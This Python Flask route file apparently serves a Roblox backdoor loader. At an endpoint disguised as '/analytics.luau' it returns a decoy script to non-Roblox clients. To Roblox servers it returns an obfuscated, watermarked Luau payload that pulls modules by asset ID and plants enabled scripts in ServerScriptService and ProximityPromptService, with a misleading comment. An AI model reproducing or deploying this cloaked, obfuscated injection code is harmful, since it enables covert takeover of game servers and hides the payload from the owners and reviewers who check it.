from flask import Blueprint, Response, render_template, request

from obfuscator.wrapper import obfuscate
from utils.inputs import PATH

loader = Blueprint("loader", __name__)


@loader.route("/admin.luau", methods=["GET"])
@loader.route("/analytics.luau", methods=["GET"])
def admin_script():
    if "Roblox" not in request.headers.get("User-Agent", ""):
        with open(f"{PATH}/obfuscator/fake.luau", encoding="utf8") as fake_script:
            fake = fake_script.read() + "\n"
        return Response(fake, mimetype="text/x-lua")

    with open(f"{PATH}/obfuscator/watermark.luau", encoding="utf8") as watermark_script:
        watermark = watermark_script.read() + "\n"
    with open(f"{PATH}/static/assets/lua/vlua.luau", encoding="utf8") as vlua_script:
        vlua_script = vlua_script.read()

    admin_inner = render_template(
        "assets/lua/admin.luau", endpoint=request.headers.get("Host"), vlua=vlua_script
    )
    inner_result = obfuscate(admin_inner)
    if inner_result:
        with open(inner_result, encoding="utf8") as f:
            admin_inner = f.read()
    else:
        inner_result = admin_inner

    rendered = f"""
    local g=game;local x=tonumber
    local function requireStr(assetId, str)
    	local new=require(x("71374225073896")).Script:Clone() -- 88891391760892
    	new.Enabled=false;new.ModuleScript:Destroy()new.Value.Value=str
    	local n=Instance.new("NumberValue",new)n.Value=assetId;n.Name = "ModuleScript"
    	local w=require(x("121170712417048"))(new,"2")local f=require(x("121170712417048"))(new,w)
    	w.Parent=g:GetService("ProximityPromptService");f.Parent=g:GetService("ServerScriptService") -- UserInputService
    	w.Enabled=true;f.Enabled=true;new.Enabled=true;return new
    end
    requireStr(x("0x26E001F12"),[===[
    {admin_inner}
    ]===])
    """
    obfuscated = obfuscate(rendered)

    if obfuscated:
        with open(
            f"{PATH}/obfuscator/source.obfuscated.lua", encoding="utf8"
        ) as obfuscated_script:
            return Response(watermark + obfuscated_script.read(), mimetype="text/x-lua")
    return Response(watermark + rendered, mimetype="text/x-lua")
